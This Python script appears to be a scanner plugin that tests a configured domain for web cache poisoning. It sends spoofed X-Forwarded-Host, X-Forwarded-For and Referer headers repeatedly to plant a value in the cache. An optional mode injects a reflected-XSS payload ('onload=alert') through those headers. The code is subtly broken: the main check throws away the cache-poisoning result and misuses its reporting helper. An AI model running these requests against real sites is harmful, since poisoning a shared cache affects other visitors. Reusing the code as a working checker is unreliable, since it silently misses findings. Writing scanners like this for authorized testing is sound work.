import requests
import os
import json
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

TIMEOUT=3

ports = os.environ.get('PORTS')
urls = ['http://{0}/'.format(os.environ.get('DOMAIN'))]
try:
    ports = ports.strip(' ').split(',')
    for port in ports:
        urls.append('http://{0}:{1}/'.format(os.environ.get('DOMAIN'), port))
except:
    pass

vuln_id = os.environ.get('VULN_ID')
find_xss = True if str(os.environ.get('FIND_XSS')).lower() == 'true' else False

payload = '127.0.0.2'
xss_payload = 'kek.kek"onload="alert();'


def resp(url, state=False, possible=False):
    if state:
        if not possible:
            return json.dumps({"vulnerable": "True", "vuln_id": vuln_id, "description": url})
        else:
            return json.dumps({"vulnerable": "True", "vuln_id": f'{vuln_id}_possible', "description": url})
    else:
        return json.dumps({"vulnerable": "False", "vuln_id": vuln_id, "description": url})


def check_wcd(url):
    default_headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.8',
        'Connection': 'close',
    }
    evil_headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
        'Referer': f'https://{payload}/',
        'X-Forwarded-For': payload,
        'X-Forwarded-Host': payload,
        'Accept-Language': 'en-US,en;q=0.8',
        'Cache-Control': 'max-age=10',
        'Connection': 'close',
    }
    short_extensions = ['css', 'png', 'jpg', 'gif', 'txt', 'js', 'swf', 'bmp']

    # prepare
    session = requests.Session()
    clean_response = requests.get(url, timeout=TIMEOUT, verify=False)
    dirty_response = session.get(url, headers=evil_headers, timeout=TIMEOUT, verify=False)
    dirty_response_payload_marker = True if dirty_response.text.find(payload) > -1 else False

    # attack
    requests.get(url, headers=evil_headers, timeout=TIMEOUT, verify=False)
    requests.get(url, headers=evil_headers, timeout=TIMEOUT, verify=False)
    requests.get(url, headers=evil_headers, timeout=TIMEOUT, verify=False)

    # check
    control_response = requests.get(url, headers=default_headers, timeout=TIMEOUT, verify=False)
    control_response_payload_marker = True if control_response.text.find(payload) > -1 else False
    content_length_attacked_diff = len(clean_response.content) == len(control_response.content)

    if dirty_response_payload_marker and control_response_payload_marker:
        return resp(url=url, state=True)
    if dirty_response_payload_marker or not content_length_attacked_diff:
        return resp(url=url, state=True, possible=True)
    return resp(url=url, state=False)


def check():
    if not urls:
        return resp(False)
    for url in urls:
        try:
            if not find_xss:
                check_wcd(url)
            if find_xss:
                return resp(url=url, state=True) if requests.get(url, headers={
                    'X-Forwarded-Host': xss_payload,
                    'X-Forwarded-For': xss_payload,
                }).text.find(
                    xss_payload) > -1 else resp(url=url, state=False)
        except Exception as ex:
            pass
    return resp(url=url, state=False)


if __name__ == '__main__':
    print(check())
